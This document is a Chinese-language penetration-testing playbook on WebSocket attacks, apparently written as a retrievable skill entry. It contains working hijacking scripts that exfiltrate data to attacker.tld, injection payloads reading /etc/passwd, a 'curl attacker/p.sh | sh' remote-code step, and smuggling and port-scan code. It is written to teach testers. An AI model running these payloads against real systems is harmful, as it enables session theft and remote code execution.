---
category: web
tags: [websocket, cswsh, cross_site_websocket_hijacking, websocket_smuggling, h2c_smuggling, websocket_injection, 跨站websocket劫持, ws协议, wss协议, upgrade_header, connection_upgrade, socket_io, websocket_hijacking, websocket_fuzzing, localhost_ws, json_rpc, prototype_pollution_ws, race_condition_ws, http2_smuggling]
triggers: [websocket, ws://, wss://, upgrade, "Sec-WebSocket", CSWSH, h2c, "Connection: Upgrade", socket.io, websocat, ws-listen, websocket smuggling, cross-site websocket, 跨站websocket, websocket劫持, ws协议, 实时通信, 双向通信]
related: [xss, ssrf, command_injection]
---

# WebSocket 攻击

## 什么时候用

目标应用使用 WebSocket 进行实时双向通信。常见于：

- 在线聊天 / 实时通知
- 实时数据推送（股票、游戏）
- 协作编辑
- 远程 Shell / 终端（JSON-RPC over WS）
- IoT 设备控制面板

## 前提条件

- 目标存在 WebSocket 端点（`ws://` 或 `wss://`）
- 能与该端点建立连接（直接或通过代理）
- 对于 CSWSH：受害者已在目标站点登录且使用 Cookie 认证

## ws:// 与 wss:// 差异

| 协议 | 传输层 | 安全性 | 备注 |
|------|--------|--------|------|
| `ws://` | 明文 TCP | ❌ 无加密，可被 MitM 嗅探/篡改 | 本地开发或内网可见 |
| `wss://` | TLS 加密 | ✅ 加密传输 | 生产环境应强制使用 |

**关键**：浏览器不对 `ws://127.0.0.1` 的 loopback 连接强制同源策略，任何页面都可尝试握手。

## 攻击步骤

### 1. 侦察与枚举

确认 WebSocket 端点存在：

```bash
# 用 websocat 直接连接
websocat --insecure wss://target.com/ws -v

# 创建本地 WS 服务器（用于测试/中继）
websocat -s 0.0.0.0:8000

# 自动发现与指纹识别
# https://github.com/PalindromeLabs/STEWS
python3 STEWS-fingerprint.py wss://target.com/ws
```

检查握手请求中的关键头部：

```http
GET /ws HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

服务端 101 响应：

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

### 2. 跨站 WebSocket 劫持 (CSWSH)

CSWSH 是 CSRF 在 WebSocket 上的特例。当 WS 握手仅依赖 Cookie 认证且无 CSRF Token 时可利用。

**利用条件**：
- WS 认证基于 Cookie
- Cookie 可跨站发送（`SameSite=None` 或无该属性）
- 服务端不校验 `Origin` 头（或可绕过）

```html
<script>
websocket = new WebSocket('wss://vulnerable-target.com/ws')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");
}
function handleReply(event) {
  fetch('https://attacker.tld/?stolen=' + encodeURIComponent(event.data), {mode: 'no-cors'})
}
</script>
```

**Gorilla WebSocket 特例**（Go 语言常用库）：当 `CheckOrigin` 设为始终返回 `true` 且端点无额外认证时，任何页面都可跨站劫持：

```html
<script>
const ws = new WebSocket("ws://victim-host:8025/api/v1/websocket");
ws.onmessage = (ev) => fetch("https://attacker.tld/steal?d=" + encodeURIComponent(ev.data), {mode: "no-cors"});
</script>
```

**子域 Cookie 窃取**：若攻击者控制了目标的子域（如通过 XSS），子域的 Cookie 会自动发送到 WS 端点，且 Origin 校验可能通过。

**CSWSH 防御检测清单**：
- ✅ 服务端是否校验 `Origin` 头
- ✅ 是否使用独立认证 Token（非 Cookie）
- ✅ Cookie 是否设置 `SameSite=Lax/Strict`
- ✅ Chrome 默认 `SameSite=Lax`（但 Cookie 创建后前 2 分钟为 `None`）
- ✅ Firefox Total Cookie Protection 是否启用

### 3. WebSocket 消息注入与常见漏洞

WS 消息可携带与 HTTP 请求相同的注入攻击载荷：

```python
# SQL 注入 — 通过 WS 消息
ws.send('{"query": "\' OR 1=1 --"}')

# XSS — 若服务端将 WS 消息渲染到页面
ws.send('<img src=x onerror=alert(document.cookie)>')

# 命令注入
ws.send('{"cmd": "ping; cat /etc/passwd"}')

# 路径遍历
ws.send('{"file": "../../../etc/passwd"}')
```

**Socket.IO 特殊处理**：识别 `EIO=4` 查询参数，保活用 Ping(`2`)/Pong(`3`)，消息格式 `42["event","data"]`：

```python
# Socket.IO 握手后发送事件
ws.send('40')                           # 建立连接
ws.send('42["message","<payload>"]')    # 发送事件
```

### 4. WebSocket Smuggling（绕过反向代理）

利用反向代理对 `Upgrade` 握手的处理缺陷，建立"假 WebSocket 隧道"访问内部端点。

#### 场景 A：伪造握手版本

1. 发送 Upgrade 请求，故意使用错误的 `Sec-WebSocket-Version`
2. 代理认为合法并转发，后端返回 `426`（版本不对）
3. 代理误以为 WS 已建立，保持 TCP 连接开放
4. 攻击者通过这个连接直接访问内部 REST API

**受影响代理**：Varnish、Envoy ≤1.8.0

#### 场景 B：SSRF + 101 响应欺骗

1. 发送 POST 请求到健康检查 API，附带 `Upgrade: websocket` 头
2. 后端健康检查访问攻击者控制的外部服务
3. 攻击者服务返回 HTTP 101，代理（如 NGINX）误认为 WS 建立
4. 攻击者通过"隧道"访问内部端点

```bash
# 测试 WebSocket Smuggling 环境
git clone https://github.com/0ang3el/websocket-smuggle.git
cd websocket-smuggle && docker-compose up
```

### 5. H2C Smuggling（HTTP/2 明文升级）

通过 `Upgrade: h2c` 让反向代理将连接升级为 HTTP/2 明文，绕过代理层的路径路由、认证和 WAF。

**核心请求头**：

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

**关键点**：一旦 H2C 连接建立，代理不再检查后续请求。即使 `proxy_pass` 指定了路径（如 `/socket.io`），实际连接默认为 `http://backend:9999`，可访问后端任意路径。

**天然转发 Upgrade 头的代理**（直接可利用）：
- HAProxy、Traefik、Nuster

**需配置不当才可利用的代理**：
- AWS ALB/CLB、NGINX、Apache、Squid、Varnish、Kong、Envoy、Apache Traffic Server

```bash
# 自动化工具
# BishopFox: https://github.com/BishopFox/h2csmuggler
python3 h2csmuggler.py -x https://proxy.target.com/ --test

# Assetnote: https://github.com/assetnote/h2csmuggler
```

### 6. Localhost WebSocket 滥用与端口发现

桌面应用常在 `127.0.0.1:<随机端口>` 暴露 JSON-RPC WebSocket（如 CurseForge、各种 IDE）。浏览器不对 loopback WS 连接强制 SOP。

**端口暴力枚举**（Chromium 可容忍 ~16k 失败连接）：

```javascript
async function findLocalWs(start = 20000, end = 36000) {
  for (let port = start; port <= end; port++) {
    await new Promise((resolve) => {
      const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
      let settled = false;
      const finish = () => { if (!settled) { settled = true; resolve(); } };
      ws.onerror = ws.onclose = finish;
      ws.onopen = () => {
        console.log(`Found candidate on ${port}`);
        ws.close();
        finish();
      };
    });
  }
}
```

**JSON-RPC 链式 RCE 模式**（以 CurseForge 为例）：
1. 调用 `createModpack` 获取新实例 GUID
2. 调用 `minecraftTaskLaunchInstance` 注入 JVM 参数

```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```

Linux 下替换为 `/bin/sh -c 'curl https://attacker/p.sh | sh'`。

⚠️ 通用模式：只要方法 A 创建服务端追踪的资源 ID，方法 B 用该 ID 执行代码/启动进程且可注入参数，就可能达成 RCE。

### 7. HTTP 连接污染（HTTP/2+）

浏览器通过 HTTP 连接合并（connection coalescing）复用连接：若两个域名解析到同一 IP 且共享 TLS 证书（如通配符 `*.example.com`），请求可能被路由到错误后端。

**利用条件**：
- 反向代理使用 first-request routing
- 通配符 TLS 证书覆盖多个子域
- 两个子域解析到同一 IP

```javascript
fetch("//sub1.example.com/", { mode: "no-cors", credentials: "include" }).then(
  () => {
    fetch("//sub2.example.com/", { mode: "no-cors", credentials: "include" })
  }
)
```

**影响**：`secure.example.com` 的请求被路由到 `wordpress.example.com` 的后端，可触发后者的 XSS 等漏洞。HTTP/3 放宽了 IP 匹配要求，攻击面将扩大。

### 8. 服务端原型污染检测（via Socket.IO）

通过 WS 发送 `__proto__` 污染载荷，观察行为变化：

```json
{"__proto__":{"initialPacket":"Polluted"}}
```

若响应中出现 "Polluted" 或行为异常，说明服务端（Node.js）存在原型污染。后续可结合原型污染 gadget 链提权。

### 9. 竞态条件

WebSocket 支持多连接并行发送，天然适合触发竞态条件：

- 使用 THREADED 引擎生成多个 WS 连接
- 并行发送触发 double-spend、token 重用、状态不一致

### 10. MitM WebSocket

在本地网络中通过 ARP 欺骗实施中间人：

```bash
# ARP 欺骗后，用 websocat 中继
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```

## 常见坑

1. **SameSite 时间窗口**：Chrome 中新创建的 Cookie 前 2 分钟为 `SameSite=None`，此窗口内 CSWSH 可能成功
2. **H2C 非标准变体**：部分后端不严格遵循 RFC，即使 `Connection` 头缺少 `HTTP2-Settings` 也接受升级
3. **Socket.IO ≠ 原生 WebSocket**：Socket.IO 有自己的帧协议（`40`/`42["..."]`/`2`/`3`），直接发原始消息不会被正确处理
4. **WS Fuzzing 可导致真实 DoS**：恶意帧（如声明巨大 payload length 但不发送数据）可导致服务端 OOM
5. **Firefox vs Chromium**：localhost 端口扫描在 Firefox 中容易崩溃，Chromium 可容忍更多失败连接

## 变体

- **WebSocket + SSRF**：WS 连接建立后通过消息触发服务端 SSRF
- **WebSocket + XSS**：WS 接收的消息未经转义直接渲染到 DOM
- **WebSocket + SQLi**：WS 消息中的参数直接拼接 SQL
- **WebSocket + 命令注入**：WS 消息作为系统命令参数
- **WebSocket + 原型污染**：通过 WS 消息污染 Node.js 服务端原型链

## 工具速查

| 工具 | 用途 |
|------|------|
| [websocat](https://github.com/vi/websocat) | CLI WS 客户端/服务器/中继 |
| [STEWS](https://github.com/PalindromeLabs/STEWS) | WS 发现、指纹、已知漏洞扫描 |
| [socketsleuth](https://github.com/snyk/socketsleuth) | Burp 扩展，WS 历史/拦截/重放 |
| [wsrepl](https://github.com/doyensec/wsrepl) | 交互式 WS REPL（渗透测试用） |
| [WSSiP](https://github.com/nccgroup/wssip) | WS/Socket.IO 代理，捕获和注入 |
| [wshook](https://github.com/skepticfx/wshook) | JS WS 钩子，拦截收发消息 |
| [h2csmuggler](https://github.com/BishopFox/h2csmuggler) | H2C Smuggling 自动化利用 |
| [websocket-smuggle](https://github.com/0ang3el/websocket-smuggle) | WS Smuggling 测试环境 |
| [PyCript-WebSocket](https://github.com/Anof-cyber/PyCript-WebSocket/) | 加密 WS 消息解密 |
| [WebSocket Turbo Intruder](https://github.com/d0ge/WebSocketTurboIntruder) | Burp 扩展，高速 WS Fuzzing |

## 相关技术

- [[web/xss]] — WS 消息注入 DOM 可触发 XSS
- [[web/ssrf]] — WS Smuggling 场景 B 依赖 SSRF；WS 消息可触发服务端请求
- [[web/command_injection]] — WS 消息作为命令参数时可注入
